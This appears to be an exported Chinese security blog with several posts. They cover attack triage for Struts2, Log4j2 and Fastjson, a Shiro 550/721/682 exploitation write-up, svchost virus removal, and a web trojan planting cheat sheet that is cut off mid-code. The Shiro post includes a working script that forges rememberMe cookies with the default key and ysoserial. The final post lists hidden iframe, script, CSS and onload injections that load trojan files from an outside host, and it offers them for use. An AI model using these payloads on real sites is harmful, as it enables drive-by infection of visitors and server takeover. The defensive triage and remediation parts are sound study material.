alt="img"></p><p><strong>攻击成功否就是看是否返回对应的命令的结果</strong></p><p><strong>.do和.action结尾的页面请求可以尝试struts2漏洞</strong></p><p>可直接rce的共有30个,其中较为常见的:16、19、32、45、46</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">-S2-001:表单验证错误OGNL循环解析导致RCE。</span><br><span class="line">-S2-003:XWork Parameterinterceptors 绕过允许OGNL语句执行。</span><br><span class="line">-S2-005:XWork Parameterinterceptors 绕过导致RCE。</span><br><span class="line">-S2-007:当出现转换错误时,用户输入被评估为OGNL表达式。</span><br><span class="line">-S2-008:Struts2中的多个严重漏洞。</span><br><span class="line">-S2-009:Parameterinterceptor漏洞导致RCE。</span><br><span class="line">-S2-012:Showcase应用程序漏洞导致RCE。</span><br><span class="line">-S2-013:存在于URL和定位标记的includeParams属性导致RCE </span><br><span class="line">-S2-014:通过强制的URL和错标签参数包括引入导致RCE,会话访问和操纵和跨站脚本攻击。</span><br><span class="line">S2-015:由通配符匹配机制或OGNL表达的双重评价引入的漏洞导致RCE。</span><br><span class="line">-S2-016:通过操纵前缀为&quot;action:&quot;/redirect:&quot;/&quot;redirectAction:&quot;的参数引入的漏洞允许远程命令执行。</span><br><span class="line">-S2-018:ActionMapper机制支持特殊参数前缀动作的访问控制漏漏</span><br><span class="line">-S2-019:动态方法调用的默认开启和默认禁止。</span><br><span class="line">-S2-020:将Commons FileUpload升级1.3.1版(DoS)并添加&quot;class以排除Parametersinterceptor中的参数避免ClassLoader操</span><br><span class="line">作。</span><br><span class="line">-S2-021:改进了Parametersinterceptor和Cookielnterceptor中挂除的参数以避免</span><br><span class="line">ClassLoader操作。</span><br><span class="line">-S2-022:扩展Cookielnterceptor中排除的参数以避免操纵Struts的内部结构。</span><br><span class="line">-S2-026:特殊的顶部对象可用于访问Struts的内部结构。</span><br><span class="line">S2-029:强制双重OGNL评估求值,当对标签属性中的原原始用户输入进行评估求值时,可能会导致RCE。</span><br><span class="line">-S2-032:启用动态方法调用时,可以通过method:前缀导致RCE。</span><br><span class="line">S2-033:启用动态方法调用时,使用REST插件则运算符!可执行远程代码。</span><br><span class="line">-S2-036:强制双重OGNL评估求值,当对标签属性中的原始用户输入进行评估求值时,可能会导致RCE。</span><br><span class="line">(S2-029的延申)</span><br><span class="line">-S2-037:使用REST插件时可以执行远程代码执行。</span><br><span class="line">-S2-045:基于Jakarta Multipart解析器执行文件上传时可能的RRCE</span><br><span class="line">-S2-046:基于Jakarta Multipart解析器执行文件上传时可能的RCE。(S2-045的异构)</span><br><span class="line">-S2-048:Struts 2.3.x系列中Struts 1插件示例中的Struts Showcase应用程序中可能存在的RCE。</span><br><span class="line">-S2-052:使用带有XStream处理程序的Struts REST插件来处理XML负载时可能存在的RCE。</span><br><span class="line">-S2-053:在Freemarker标签中使用无意表达式而不是字符串文字时可能导致RCE。</span><br><span class="line">-S2-055:JacksonJSON库中的RCE漏洞</span><br><span class="line">-S2-057:alwaysSelectFullNamespace的RCE漏洞触发条件:定义XML配置时namespace值未设置且上层动作配置(Action</span><br><span class="line">Configuration)中未设置或用通配符namespace;url标签未设置value和action值且上层动作未设置或用通配符namespace。</span><br><span class="line">-S2-059:强制双重OGNL评估,当对标签属性中的原始用户输入进行评估时,可能会导致远程代码执行。</span><br><span class="line">-S2-061:强制双重OGNL评估,当对标签属性中的原始用户输入进行评估时,可能会导致远程代码执行。(S2-059的延申)</span><br></pre></td></tr></table></figure><h2 id="7-Log4j2-远程代码执行漏洞原理？"><a href="#7-Log4j2-远程代码执行漏洞原理？" class="headerlink" title="7.Log4j2 远程代码执行漏洞原理？"></a>7.<strong>Log4j2 远程代码执行漏洞原理？</strong></h2><p>1、框架中存在一个名为 JNDI Lookup 的功能，它允许通过配置文件中的 JNDI 名称引用外部资源</p><p>2、攻击者构造一个特殊的日志消息，其中包含恶意的 JNDI 名称，并通过网络发送给受影响的应用程序。</p><p>3、当应用程序使用 Log4j2 框架解析日志消息时，它会尝试查找和引用该 JNDI 名称。</p><p>4、如果恶意的 JNDI 名称指向一个恶意的远程资源，例如恶意的 LDAP 服务器或 RMI 服务，攻击者可以控制该远程资源的内容和行为。</p><p>5、攻击者可以在恶意的远程资源中注入恶意代码，并在目标系统上执行任意命令或获取敏感信息。</p><p><strong>如何判断成功否？</strong></p><p>1、dnslog类：查看是否存在源ip与dnslog的外联日志记录</p><p>2、命令执行攻击</p><p>2.1 有回显：响应体中存在命令执行结果</p><p>2.2无回显 ：存在源ip与ldap服务ip的外联日志记录</p><h2 id="8-安全设备发现Linux挖矿告警，上机执行ps，top命令未发现挖矿及恶意进程，怀疑linux中ps，top命令被替换，动态链接库被劫持，请问应该如何处理？"><a href="#8-安全设备发现Linux挖矿告警，上机执行ps，top命令未发现挖矿及恶意进程，怀疑linux中ps，top命令被替换，动态链接库被劫持，请问应该如何处理？" class="headerlink" title="8.安全设备发现Linux挖矿告警，上机执行ps，top命令未发现挖矿及恶意进程，怀疑linux中ps，top命令被替换，动态链接库被劫持，请问应该如何处理？"></a><strong>8.安全设备发现Linux挖矿告警，上机执行ps，top命令未发现挖矿及恶意进程，怀疑</strong>linux中ps，top命令被替换，动态链接库被劫持，请问应该如何处理？</h2><h3 id="命令被替换"><a href="#命令被替换" class="headerlink" title="命令被替换"></a>命令被替换</h3><p>1、使用cat &#x2F;etc&#x2F;ld.so.preload命令查看动态链接库文件是否加载有so文件，提取加载的so文件上传至威胁情报平台，判断是否为恶意so文件</p><p>2、清除so文件，使用ldconfig命令重新加载动态链接库，执行ps，top命令查看是否可以发现挖矿进程信息</p><ol start="3"><li>确认ps和top命令是否被替换：可以使用命令”which ps”和”which top”查看这两个命令的路径是否为系统默认路径”&#x2F;bin&#x2F;ps”和”&#x2F;usr&#x2F;bin&#x2F;top”，如果不是则说明被替换。也可以通过比较ps和top命令的md5值来判断是否一致。</li></ol><h3 id="动态链接库是否被劫持"><a href="#动态链接库是否被劫持" class="headerlink" title="动态链接库是否被劫持"></a>动态链接库是否被劫持</h3><p>确认动态链接库是否被劫持：可以使用命令”ldd &#x2F;bin&#x2F;ps”和”ldd &#x2F;usr&#x2F;bin&#x2F;top”查看这两个命令依赖的动态链接库是否正常，如果有动态链接库被替换，则会发现其中一些动态链接库路径不对</p><h3 id="恢复被替换的命令和动态链接库"><a href="#恢复被替换的命令和动态链接库" class="headerlink" title="恢复被替换的命令和动态链接库"></a>恢复被替换的命令和动态链接库</h3><p>如果确认被替换，可以从系统安装介质或官方网站上下载对应版本的ps和top命令和动态链接库，替换掉被替换的文件即可。</p><p>替换命令和动态链接库只是暂时的措施，需要进一步排查系统安全状况，比如查杀恶意程序、加强访问控制、更新系统补丁等，以防止类似问题再次发生</p><p>6<strong>借助工具busybox</strong></p><h2 id="9-如何研判JBOSS-反序列化漏洞攻击成功？"><a href="#9-如何研判JBOSS-反序列化漏洞攻击成功？" class="headerlink" title="9.如何研判JBOSS 反序列化漏洞攻击成功？"></a>9.如何研判JBOSS 反序列化漏洞攻击成功？</h2><p>1.在访问JBOSS漏洞页面&#x2F;invoker&#x2F;readonly后，返回值为500</p><p>2.请求体有llections.map.LazyMap、keyvalue.TiedMapEntry攻击链特征并且有明显的命令执行行为比如whoami</p><p>3.在返回500 堆栈报错页面内容中包含了系统返回内容 比如系统用户：root</p><h2 id="10-如何研判Fastjson反序列化漏洞攻击成功？"><a href="#10-如何研判Fastjson反序列化漏洞攻击成功？" class="headerlink" title="10.如何研判Fastjson反序列化漏洞攻击成功？"></a>10.如何研判Fastjson反序列化漏洞攻击成功？</h2><p>原理也是jdni注入 利用就是构造一个json字符，用**@type指定一个类库**</p><p>Fastjson反序列化的Gadget需要无参默认构造方法或者注解指定构造方法并添加相应参数。使用Feature.SupportNonPublicField才能打开非公有属性的反序列化处理,如果开启了autotype功能,<strong>引用@type可以指定反序列化任意类调用其set,get,is方法,并且由于反序列化的特性,我们可以通过目标类的set方法自由的设置类的属性值。如果类中使用了json.parse()反序列化了恶意数据就会造成任意代码执行。</strong></p><p><strong>小于等于1.2.24:</strong></p><p>直接抓包发送@type格式的恶意json数据。</p><p><strong>小于等于1.2.45</strong></p><p>默认不开启autotype功能,使用java.lang.class指定类放入缓存,fastjon调用缓存中的类就可以了。</p><p>流量特征:jsonautotype</p><p>1.请求头：<code>method: POST</code> <code>content_type: application/json</code></p><p>2.请求体：<code>data:com.sun.rowset.JdbcRowSetImpl,dataSourceName</code>,<code>@type</code></p><p>3.请求体: 包含攻击者C2服务器地址</p><p>4.状态码为：400  也可能是500</p><h2 id="11-反序列化"><a href="#11-反序列化" class="headerlink" title="11.反序列化"></a>11.反序列化</h2><h3 id="JAVA反序列化"><a href="#JAVA反序列化" class="headerlink" title="JAVA反序列化"></a>JAVA反序列化</h3><p>可以将java对象解析为json(字节序列),也可以将json反序列化为java对象</p><p>该类必须实现java.io.Serializable接口</p><p>该类的所有属性必须是可序列化的。如果有一个属性不是可序列化的,则该属性必须注明是短暂的。</p><h3 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h3><p>流量特征:</p><p>将文本形式的字节序列反序列化为变量和值</p><p>(1)TCP:必有aced0005,这个16进制流基本上也意味者java反序列化的开始;</p><p>(2)HTTP:必有rOOAB,其实这就是aced0005的base64编码码的结果;</p>]]></content>
      
      
      <categories>
          
          <category> bt </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>shiro-550-721-682</title>
      <link href="/2023/07/07/shiro%20550%E3%80%81721%E3%80%81682/"/>
      <url>/2023/07/07/shiro%20550%E3%80%81721%E3%80%81682/</url>
      
        <content type="html"><![CDATA[<hr><p>Apache Shiro是一款开源安全框架，提供身份验证、授权、密码学和会话管理。Shiro框架直观、易用，同时也能提供健壮的安全性</p><h1 id="Apache-Shiro-1-2-4反序列化漏洞（CVE-2016-4437）-550"><a href="#Apache-Shiro-1-2-4反序列化漏洞（CVE-2016-4437）-550" class="headerlink" title="Apache Shiro 1.2.4反序列化漏洞（CVE-2016-4437）-550"></a>Apache Shiro 1.2.4反序列化漏洞（CVE-2016-4437）-550</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p><strong>Apache Shiro 1.2.4及以前版本中</strong>，<strong>加密的用户信息序列化后存储在名为remember-me的Cookie中</strong>,比如访问淘宝等网站时，关闭了浏览器下次再打开时还是能够记住上次访问过的用户，下次访问时无需再登录即可访问。攻击者可以使用Shiro的默认密钥伪造用户Cookie，触发Java反序列化漏洞，进而在目标机器上执行任意命令</p><p>Shiro会对cookie中的Remember me字段进行相关处理：<strong>序列化–&gt;AES加密–&gt;base64编码</strong></p><p><strong>Shiro本身含有一个预设的AES密钥Base64.decode(“KPHblxk5D2deZilxcaaaA&#x3D;&#x3D;”)<strong>，每个人都能够通过源代码拿到该密钥，</strong>也即****存在默认key，</strong>因此攻击者可以构造一个恶意的对象，对其进行序列化并用该密钥进行加密，base64编码，最后作为cookie中的Remember me字段发送。Shiro得到该Remember me字段后进行解码解密并且反序列化，进而导致任意命令执行</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h3><ul><li>Apache &lt;&#x3D; 1.2.4</li></ul><h3 id="特征判断"><a href="#特征判断" class="headerlink" title="特征判断"></a>特征判断</h3><p>发送正常包，返回包中含有rememberMe&#x3D;deleteMe字段</p><p><img src="1654170546793-43c0fa77-71e0-4621-939a-2b5de6bf1bea.png" alt="img"></p><p>修改Cookie中的内容，改为Cookie: rememberMe&#x3D;1，发现多出一条Site-Cookie，存在漏洞</p><p><img src="1654170637364-2687bbbb-f389-4b8f-8854-2e20e02ff0a5.png" alt="img"></p><h3 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h3><p>cooike的内容可以这样修改：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode_rememberme</span>(<span class="params">command</span>):</span><br><span class="line">    </span><br><span class="line">    popen = subprocess.Popen([<span class="string">&#x27;java&#x27;</span>, <span class="string">&#x27;-jar&#x27;</span>, <span class="string">&#x27;ysoserial.jar&#x27;</span>, <span class="string">&#x27;JRMPClient&#x27;</span>, command], stdout=subprocess.PIPE)</span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - <span class="built_in">len</span>(s) % BS) * <span class="built_in">chr</span>(BS - <span class="built_in">len</span>(s) % BS)).encode()</span><br><span class="line">    key = base64.b64decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>)</span><br><span class="line">    iv = uuid.uuid4().<span class="built_in">bytes</span></span><br><span class="line">    encryptor = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    file_body = pad(popen.stdout.read())</span><br><span class="line">    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    <span class="keyword">return</span> base64_ciphertext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    payload = encode_rememberme(sys.argv[<span class="number">1</span>])</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;rememberMe=&#123;0&#125;&quot;</span>.<span class="built_in">format</span>(payload.decode())</span><br></pre></td></tr></table></figure><h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><ul><li>删除代码中的默认密钥</li><li>升级Shiro到1.2.5及以上</li><li>不要使用网上的密钥，可以自己base64生成一个AES密钥</li></ul><h1 id><a href="#" class="headerlink" title></a></h1><h1 id="Padding-Oracle-AttackRCE-721（CVE-2019-12422）-721"><a href="#Padding-Oracle-AttackRCE-721（CVE-2019-12422）-721" class="headerlink" title="Padding Oracle AttackRCE-721（CVE-2019-12422）-721"></a>Padding Oracle AttackRCE-721（CVE-2019-12422）-721</h1><p>一句话总结：由于Apache Shiro cookie中通过 AES-128-CBC 模式加密的rememberMe字段存在问题，用户可通过Padding Oracle 加密生成的攻击代码来构造恶意的rememberMe字段，并重新请求网站，进行反序列化攻击，最终导致任意代码执行。</p><p><strong>出网协议：****jndi，ldap，rmi，总共7个</strong></p><h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><p>Shiro使用了<strong>AES-128-CBC</strong>模式对cookie进行加密，这个CBC加密方式存在一个 Padding Oracle Attack( 填充 Oracle 攻击 )，可以通过爆破获取到所有的明文值，这样明文值和密文值则都知道了，但是这貌似并起不到反序列化的作用，如果可以改变密文值(也就是rememberMe字段Cookie)，从而达到经过服务器端AES解密后的明文值存在我们的恶意序列化数据，这样就可以实现攻击了，而在知道密文值和明文值的条件下，可以完成这一功能的有CBC Byte-Flipping Attack ( CBC字节翻转攻击 )</p><p><strong>CBC Byte-Flipping Attack ( CBC字节翻转攻击 )</strong> 可以通过改变密文值来达到改变经服务器端AES解密后的数据的作用</p><p><a href="https://blog.csdn.net/qq_53264525/article/details/121757496"></a></p><h2 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h2><h3 id="版本-1"><a href="#版本-1" class="headerlink" title="版本"></a>版本</h3><ul><li>Apache &lt; 1.4.2</li></ul><h3 id="特征判断-1"><a href="#特征判断-1" class="headerlink" title="特征判断"></a>特征判断</h3><p>(1) 认证失败时（输入错误的用户名和密码），http响应页面中会显示出deleteMe的cookie:</p><p><img src="1654174055324-aed95a9c-4554-425f-8418-b1403cc8afda.png" alt="img"></p><p>(2) 认证成功（输入正确的用户名和密码登录），http响应页面中不会显示deleteMe的cookie:</p><p><img src="1654174069255-51e0d3a0-f62d-4f7d-8f59-b6d0b3554c32.png" alt="img"></p><h3 id="方法-1"><a href="#方法-1" class="headerlink" title="方法"></a>方法</h3><p>后续利用就是利用公开exp使用Padding Oracle方式爆出payload加密后的密文，时间比较长，最终将这个payload加上rememberMe在之前的页面重放即可。</p><h2 id="缺陷"><a href="#缺陷" class="headerlink" title="缺陷"></a>缺陷</h2><p>时间太长，不适用于实际环境的测试。会把环境打崩或者ip被ban</p><h2 id="修复-1"><a href="#修复-1" class="headerlink" title="修复"></a>修复</h2><p>1.更新版本Apache Shior到最新版本：</p><ol><li><ol><li>升级至安全版本</li><li>关闭rememberMe持久化登录功能。</li></ol></li><li><p>临时防范建议：</p></li></ol><p>在安全设备尝试拦截爆破流量，及时阻止攻击者进行尝试性攻击。</p><p>​    a. 升级Shiro到最新版</p><p>​    b.升级对应JDK版本到 8u191&#x2F;7u201&#x2F;6u211&#x2F;11.0.1 以上</p><p>​    c.WAF拦截Cookie中长度过大的rememberMe值</p><p>​    d.WAF拦截访问过于频繁的IP, 因为该漏洞需要爆破Cookie</p><h1 id="Apache-Shiro-认证绕过漏洞（CVE-2020-1957）-682"><a href="#Apache-Shiro-认证绕过漏洞（CVE-2020-1957）-682" class="headerlink" title="Apache Shiro 认证绕过漏洞（CVE-2020-1957）-682"></a>Apache Shiro 认证绕过漏洞（CVE-2020-1957）-682</h1><h2 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h2><p>在Apache Shiro 1.5.2以前的版本中，Shiro拦截器和requestURI的匹配流程与Web框架的拦截器的匹配流程有差异，在使用Spring动态控制器时，攻击者通过构造<code>..;</code>这样的跳转，可以绕过Shiro中对目录的权限限制</p><h2 id="利用-2"><a href="#利用-2" class="headerlink" title="利用"></a>利用</h2><h3 id="版本-2"><a href="#版本-2" class="headerlink" title="版本"></a>版本</h3><ul><li>Apache &lt; 1.5.0   </li><li>Shiro &lt; 1.5.2    由于Shiro 1.5.0版本修复补丁考虑不全面，导致补丁绕过，出现了第二种攻击方式，</li></ul><h3 id="详细原理"><a href="#详细原理" class="headerlink" title="详细原理"></a>详细原理</h3><p><a href="https://www.safedog.cn/news.html?id=4441">https://www.safedog.cn/news.html?id=4441</a></p><p>或者</p><p><a href="https://www.freebuf.com/vuls/231909.html">https://www.freebuf.com/vuls/231909.html</a></p><p>简单来说</p><ul><li>客户端请求URL: <code>/xxx/..;/admin/</code></li><li>Shrio 内部处理得到校验URL为<code> /xxxx/..</code>，校验通过</li><li>SpringBoot 处理 <code>/xxx/..;/admin/ </code>, 最终请求 &#x2F;admin&#x2F;, 成功访问了后台请求。</li></ul><h2 id="修复-2"><a href="#修复-2" class="headerlink" title="修复"></a>修复</h2><p>1.升级1.5.2版本及以上</p><p>2.尽量避免使用*通配符作为动态路由拦截器的URL路径表达式。</p><h2 id="其他认证绕过漏洞"><a href="#其他认证绕过漏洞" class="headerlink" title="其他认证绕过漏洞"></a>其他认证绕过漏洞</h2><h3 id="CVE-2020-17523"><a href="#CVE-2020-17523" class="headerlink" title="CVE-2020-17523"></a>CVE-2020-17523</h3><p>受影响版本：&lt;1.7.1<br>访问**&#x2F;admin&#x2F;%20**即可绕过：</p><p><img src="1654176159758-34dd7f63-e1b1-4bbf-bf72-b2baa82a18e8.png" alt="img"></p><p>参考：<a href="https://www.anquanke.com/post/id/230935">https://www.anquanke.com/post/id/230935</a></p><h3 id="CVE-2020-17510"><a href="#CVE-2020-17510" class="headerlink" title="CVE-2020-17510"></a>CVE-2020-17510</h3><ul><li>version：&lt;1.7.0<br>暂无poc</li></ul><h3 id="CVE-2020-13933"><a href="#CVE-2020-13933" class="headerlink" title="CVE-2020-13933"></a>CVE-2020-13933</h3><p>受影响版本：&lt; 1.6.0<br>访问**&#x2F;admin&#x2F;%3bpage**即可绕过</p><p><img src="1654176225016-e613353f-c155-47a4-ad31-ac30bf86e287.png" alt="img"></p><p>参考：<a href="https://xz.aliyun.com/t/8230">https://xz.aliyun.com/t/8230</a></p><h3 id="CVE-2020-11989"><a href="#CVE-2020-11989" class="headerlink" title="CVE-2020-11989"></a>CVE-2020-11989</h3><p>受影响版本 : &lt;1.5.3<br>访问**&#x2F;;&#x2F;admin&#x2F;1**即可绕过<br> <img src="1654176284928-49d7e0d8-52c1-4f67-b61c-04cad6be082a.png" alt="img"></p><p>参考：<a href="https://mp.weixin.qq.com/s?__biz=Mzg2NTA4OTI5NA==&mid=2247488061&idx=1&sn=1d85c84949b11de0fd6319319929ecc7&chksm=ce5e305cf929b94aa87b94e1c0323b78d9e3782ff66f622ce5a9b01a99bdbd174f9fb92f19fd&mpshare=1&scene=23&srcid=0805vQIgw6kPbsyHFJFqbqky&sharer_sharetime=1596621227588&sharer_shareid=ff83fe2fe7db7fcd8a1fcbc183d841c4#rd">https://mp.weixin.qq.com/s?__biz=Mzg2NTA4OTI5NA==&amp;mid=2247488061&amp;idx=1&amp;sn=1d85c84949b11de0fd6319319929ecc7&amp;chksm=ce5e305cf929b94aa87b94e1c0323b78d9e3782ff66f622ce5a9b01a99bdbd174f9fb92f19fd&amp;mpshare=1&amp;scene=23&amp;srcid=0805vQIgw6kPbsyHFJFqbqky&amp;sharer_sharetime=1596621227588&amp;sharer_shareid=ff83fe2fe7db7fcd8a1fcbc183d841c4#rd</a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>清除svchost.exe病毒</title>
      <link href="/2023/07/07/%E6%80%8E%E6%A0%B7%E6%B8%85%E9%99%A4svchost.exe%E7%97%85%E6%AF%92/"/>
      <url>/2023/07/07/%E6%80%8E%E6%A0%B7%E6%B8%85%E9%99%A4svchost.exe%E7%97%85%E6%AF%92/</url>
      
        <content type="html"><![CDATA[<hr><p>Svchost.exe 是从动态链接库 (DLL) 中运行的服务的通用主机进程名称。这个程序对系统的正常运行是非常重要，而且是不能被结束的。每一个Svchost. exe 进程以一个 Group(组)的方式分组管理各种服务</p><p><img src="image-20230724212117982.png" alt="image-20230724212117982"></p><p> <strong>Svchost.exe在Windows XP的系统目录\Windows\System32\ 下</strong>，在启动的时候，Svchost.exe根据注册表中的相关信息建立一个 服务列表并根据这个列表加载相关的服务。一般来说，<strong>Svchost.exe 总是根据 HKEY_LOCAL_MACHINE\Software\Microsoft\WindowsNT\CurrentVersion\Svchost下面的键值分组管理DLL 申请的服务</strong>，这里的每一键值对应一个独立的Svchost.exe进程，也就是说<strong>这里的键值就是在任务管理器中我们看到的Svchost.exe进程</strong></p><h2 id="怎样清除svchost-exe病毒"><a href="#怎样清除svchost-exe病毒" class="headerlink" title="怎样清除svchost.exe病毒"></a>怎样清除svchost.exe病毒</h2><p>步骤1、用unlocker删除类似于C:\SysDayN6这样的文件夹：例如C:\Syswm1i、C:\SysAd5D等等，这些文件夹有个共同特点，就是名称为 Sys*** (***是三到五位的随机字母)。</p><p>步骤2、开始——运行——输入“regedit”——打开注册表，展开注册表到以下位置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</span><br></pre></td></tr></table></figure><p>删除右边所有用纯数字为名的键，如&lt;66&gt;、&lt;333&gt;、&lt;50&gt;、&lt;4&gt;</p><p>步骤3、重新启动计算机，病毒清除完毕。</p>]]></content>
      
      
      <categories>
          
          <category> bt </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>网页挂马</title>
      <link href="/2023/07/07/%E7%BD%91%E9%A1%B5%E6%8C%82%E9%A9%AC/"/>
      <url>/2023/07/07/%E7%BD%91%E9%A1%B5%E6%8C%82%E9%A9%AC/</url>
      
        <content type="html"><![CDATA[<hr><h1 id="一-框架挂马"><a href="#一-框架挂马" class="headerlink" title="一:框架挂马"></a>一:框架挂马</h1><p>#<iframe src="地址" width="0" height="0"></iframe></p><h2 id="二-js文件挂马"><a href="#二-js文件挂马" class="headerlink" title="二:js文件挂马"></a>二:js文件挂马</h2><p>首先将以下代码</p><p>document.write(“<iframe width="0" height="0" src="地址"></iframe>“);</p><p>保存为xxx.js，</p><p>则JS挂马代码为</p><script language="javascript" src="xxx.js"></script><h2 id="三-js变形加密"><a href="#三-js变形加密" class="headerlink" title="三:js变形加密"></a>三:js变形加密</h2><SCRIPT language="JScript.Encode" src="http://www.upx.com.cn/muma.txt%3E%3C/script%3E" muma.txt可改成任意后缀 ## 四:body挂马 <body onload="window.location='地址';"></body>## 五:隐蔽挂马top.document.body.innerHTML = top.document.body.innerHTML + '\r\n<iframe src="http://www.upx.com.cn/muma.htm/"%3E%3C/iframe%3E';## 六:css中挂马body {background-image: url('javascript:document.write("<script src=http://www.upx.com.cn/muma.js%3E%3C/script%3E")')}## 七:JAJA挂马<SCRIPT language=javascript>window.open ("地址","","toolbar=no,location=no,directories=no,status=no,menubar=no,scro llbars=no,width=1,height=1");<h2 id="八-图片伪装"><a href="#八-图片伪装" class="headerlink" title="八:图片伪装"></a>八:图片伪装</h2><html><iframe src="网马地址" height="0" width="0"></iframe><p><img src="图片地址"></p></html><h2 id="九-伪装调用："><a href="#九-伪装调用：" class="headerlink" title="九:伪装调用："></a>九:伪装调用：</h2><frameset rows="444,0" cols="*"><frame src="打开网页" framborder="no" scrolling="auto" noresize marginwidth="0" margingheight="0"><frame src="网马地址" frameborder="no" scrolling="no" noresize marginwidth="0" margingheight="0"></frameset><h2 id="十-高级欺骗"><a href="#十-高级欺骗" class="headerlink" title="十:高级欺骗"></a>十:高级欺骗</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;http://www.163.com(迷惑连接地址，显示这个地址指向木马地址)&quot; onMouseOver=&quot;www_163_com(); return true;&quot;&gt; 页面要显示的内容 &lt;/a&gt;</span><br><span class="line">&lt;SCRIPT Language=&quot;JavaScript&quot;&gt;</span><br><span class="line">function www_163_com ()</span><br><span class="line">&#123;</span><br><span class="line">var url=&quot;网马地址&quot;;</span><br><span class="line">open(url,&quot;NewWindow&quot;,&quot;toolbar=no,location=no,directories=no,status=no,menubar=no,scrollbars=no,resizable=no,copyhistory=yes,width=800,height=600,left=10,top=10&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&lt;/SCRIPT&gt;</span><br></pre></td></tr></table></figure><h2 id="十一-判断系统代码"><a href="#十一-判断系统代码" class="headerlink" title="十一:判断系统代码"></a>十一:判断系统代码</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.0 Transitional//EN&quot;&gt;</span><br><span class="line">&lt;HTML&gt;&lt;HEAD&gt;&lt;TITLE&gt;404&lt;/TITLE&gt;</span><br><span class="line">&lt;META http-equiv=Content-Type content=&quot;text/html; charset=windows-1252&quot;&gt;</span><br><span class="line">&lt;META content=&quot;MSHTML 6.00.2900.2769&quot; name=GENERATOR&gt;&lt;/HEAD&gt;</span><br><span class="line">&lt;BODY&gt;</span><br><span class="line">&lt;SCRIPT language=javascript&gt;</span><br><span class="line">window.status=&quot;&quot;;</span><br><span class="line">if(navigator.userAgent.indexOf(&quot;Windows NT 5.1&quot;) != -1)</span><br><span class="line">window.location.href=&quot;tk.htm&quot;;</span><br><span class="line">else</span><br><span class="line">window.location.href=&quot;upx06014.htm&quot;;</span><br><span class="line">&lt;/SCRIPT&gt;</span><br><span class="line">&lt;/BODY&gt;&lt;/HTML&gt;</span><br></pre></td></tr></table></figure><h2 id="十二-判断是否有ms06014代码"><a href="#十二-判断是否有ms06014代码" class="headerlink" title="十二:判断是否有ms06014代码"></a>十二:判断是否有ms06014代码</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 